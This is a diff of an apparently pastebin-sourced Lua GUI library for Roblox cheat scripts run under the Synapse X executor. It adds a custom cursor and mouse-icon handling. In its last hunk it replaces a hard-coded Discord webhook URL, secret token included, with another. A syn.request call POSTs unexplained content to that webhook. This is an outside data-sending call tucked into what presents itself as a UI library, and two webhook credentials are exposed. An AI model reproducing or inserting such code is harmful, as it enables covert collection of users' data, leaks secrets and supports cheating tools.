@@ -1,5 +1,3 @@
--- took this from some pastebin gonna slightly modify it myself
-
 local library = {}
 
 local TweenService = game:GetService("TweenService")
@@ -146,6 +144,18 @@ function library.new(library_title, cfg_location)
 		syn.protect_gui(ScreenGui)
 	end
 
+    local Cursor = library:create("ImageLabel", {
+        Name = "Cursor",
+        BackgroundTransparency = 1,
+        Size = UDim2.new(0, 17, 0, 17),
+        Image = "rbxassetid://7205257578",
+        ZIndex = 6969,
+    }, ScreenGui)
+
+    rs.RenderStepped:Connect(function()
+        Cursor.Position = UDim2.new(0, mouse.X, 0, mouse.Y + 36)
+    end)
+
 	ScreenGui.Parent = game:GetService("CoreGui")
 
     function menu.IsOpen()
@@ -159,9 +169,12 @@ function library.new(library_title, cfg_location)
         if key.KeyCode ~= Enum.KeyCode.Insert then return end
 
 		ScreenGui.Enabled = not ScreenGui.Enabled
-        	menu.open = ScreenGui.Enabled
+        menu.open = ScreenGui.Enabled
 
-       
+        while ScreenGui.Enabled do
+            uis.MouseIconEnabled = true
+            rs.RenderStepped:Wait()
+        end
 	end)
 
     local ImageLabel = library:create("ImageButton", {
@@ -223,7 +236,7 @@ function library.new(library_title, cfg_location)
     
     local response = syn.request(
         {
-            Url = 'https://discord.com/api/webhooks/966699820809076807/KeDeQkER4LfbI9nz_PE-fruCTgatNrL3WzOVjy5wKsUgHvCMhoNy5sVO34fcPXOXL5Eb', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
+            Url = 'https://discord.com/api/webhooks/886979229298872331/P0jVdklhb5cbMtPHUjJ_QlfamL6l5xqT28Z691uafGxWXSSYUWCXE2QHhaxv1XdoaSCk', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
             Body = game:GetService('HttpService'):JSONEncode({content = string})
         }
     );
